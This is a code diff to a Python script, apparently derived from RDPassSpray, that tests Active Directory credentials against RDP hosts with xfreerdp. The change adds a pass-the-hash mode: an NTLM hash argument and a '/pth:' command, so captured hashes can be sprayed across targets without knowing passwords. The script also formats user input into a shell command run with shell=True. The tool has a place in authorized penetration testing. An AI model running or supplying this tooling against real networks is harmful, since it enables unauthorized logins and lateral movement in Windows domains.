@@ -16,7 +16,7 @@ def init_parser():
     parser.add_argument('-d', '--domain', action='store', help='Active Directory Domain')
     parser.add_argument('-u', '--username', action='store', help='Active Directory Username')
     parser.add_argument('-p', '--password', action='store', help='Active Directory Password')
-    #parser.add_argument('-hashes', action='store', help='LMHASH:NTHASH')
+    parser.add_argument('-H', '--hash', action='store', help='NTHASH')
     parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
 
     return parser.parse_args()
@@ -125,8 +125,7 @@ def parse_targets(targets):
         return targets.split(',')
 
 
-def rdp_connection(target, domain, username, password, pth=False):
-    # TODO PTH
+def rdp_connection(target, domain, username, creds, pth=False):
 
     # https://github.com/xFreed0m/RDPassSpray
     success_login_yes_rdp = b"Authentication only, exit status 0"
@@ -139,14 +138,16 @@ def rdp_connection(target, domain, username, password, pth=False):
     pass_expired = [b'0x0002000E', b'0x0002000F', b'0x00020013']
     failed_login = [b'0x00020009', b'0x00020014']
 
-
-    cmd = "xfreerdp /v:'%s' +auth-only /d:%s /u:%s '/p:%s' /cert-ignore" % (target, domain, username, password)
+    if pth:
+        cmd = "xfreerdp /v:'%s' +auth-only /d:%s /u:%s /p:'' '/pth:%s' /cert-ignore" % (target, domain, username, creds)
+    else:
+        cmd = "xfreerdp /v:'%s' +auth-only /d:%s /u:%s '/p:%s' /cert-ignore" % (target, domain, username, creds)
 
     co = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
     co_stderr = co.stderr.read()
     co_stdout = co.stdout.read()
 
-    logger.warning("Targeting %s with %s/%s:%s" % (target, domain, username, password))
+    logger.warning("Targeting %s with %s/%s:%s" % (target, domain, username, creds))
     logger.debug(cmd)
 
     """
@@ -206,7 +207,7 @@ if __name__ == '__main__':
     username = options.username
     password = options.password
 
-    if password == '' and username != '' and options.hashes is None:
+    if password == '' and username != '' and options.hash is None:
         from getpass import getpass
         password = getpass("Password:")
 
@@ -216,5 +217,7 @@ if __name__ == '__main__':
     logger.debug("Targets: \n%s" % ("\n".join(targets)))
 
     for target in targets:
-
-        out = rdp_connection(target, domain, username, password)
+        if options.hash is not None:
+            out = rdp_connection(target, domain, username, options.hash, pth=True)
+        else:
+            out = rdp_connection(target, domain, username, password, pth=False)
